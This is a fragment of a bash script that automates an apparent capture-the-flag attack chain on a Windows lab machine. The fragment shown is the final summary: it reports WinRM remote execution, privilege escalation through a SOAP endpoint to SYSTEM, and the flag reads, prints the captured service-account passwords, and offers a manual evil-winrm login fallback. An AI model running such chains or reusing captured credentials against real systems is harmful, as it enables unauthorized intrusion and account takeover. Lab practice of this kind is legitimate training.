echo -e "  ${CYAN}Phase 7 ${RESET}  WinRM/WMI      ${GREEN}✓${RESET}  Remote command execution as sqlmgmt"
echo -e "  ${CYAN}Phase 8 ${RESET}  User Flag      ${USER_STATUS}  Auto-read user.txt"
echo -e "  ${CYAN}Phase 9 ${RESET}  WCF Local Enum ${WCF_STATUS}  KillProcess endpoint reachable"
echo -e "  ${CYAN}Phase 10${RESET}  SOAP PE        ${ROOT_STATUS}  Root flag exfil via SYSTEM context"
echo ""
echo -e "  ${BOLD}WorkDir   :${RESET} $WORKDIR"
echo -e "  ${BOLD}CheatSheet:${RESET} $WORKDIR/CHEATSHEET.txt"
echo -e "  ${BOLD}SOAP XML  :${RESET} $WORKDIR/kill.xml"
echo ""
echo -e "  ${BOLD}Captured Credentials:${RESET}"
echo -e "   - sqlsvc   : ${SQL_PASS}"
echo -e "   - ${CAPTURED_USER} : ${CAPTURED_PASS}"
[[ -n "$USER_FLAG" ]] && echo -e "   - USER FLAG: ${GREEN}${USER_FLAG}${RESET}"
[[ -n "$ROOT_FLAG" ]] && echo -e "   - ROOT FLAG: ${GREEN}${ROOT_FLAG}${RESET}"
if [[ -z "$USER_FLAG" || -z "$ROOT_FLAG" ]]; then
  echo -e "\n  ${YELLOW}Manual fallback:${RESET} evil-winrm -i $TARGET -u $CAPTURED_USER -p '$CAPTURED_PASS'"
  [[ -z "$USER_FLAG" ]] && echo -e "   - type C:\\Users\\${CAPTURED_USER}\\Desktop\\user.txt"
  [[ -z "$ROOT_FLAG" ]] && echo -e "   - type C:\\ProgramData\\overwatch_root.txt"
fi
divider
